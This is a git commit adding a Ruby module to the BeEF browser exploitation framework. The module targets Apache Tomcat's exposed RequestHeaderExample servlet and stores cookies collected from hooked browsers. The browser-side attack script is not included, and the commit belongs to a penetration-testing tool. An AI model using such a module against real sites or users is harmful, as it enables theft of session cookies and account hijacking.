c8595b09b766c64255be9535a3a511c466ff1621
Brendan Coles <bcoles@gmail.com>
2021-11-09 05:36:33 +0000

    Modules: Add apache_tomcat_examples_cookie_disclosure module

---
+++ modules/browser/hooked_domain/apache_tomcat_examples_cookie_disclosure/module.rb
@@ -0,0 +1,19 @@
+#
+# Copyright (c) 2006-2021 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+class Apache_tomcat_examples_cookie_disclosure < BeEF::Core::Command
+
+  def self.options
+    [
+      {'name' => 'request_header_servlet_path', 'ui_label' => "'Request Header Example' path", 'value' => '/examples/servlets/servlet/RequestHeaderExample'},
+    ]
+  end
+
+	def post_execute
+		content = {}
+		content['cookies'] = @datastore['cookies']
+		save content
+	end
+end
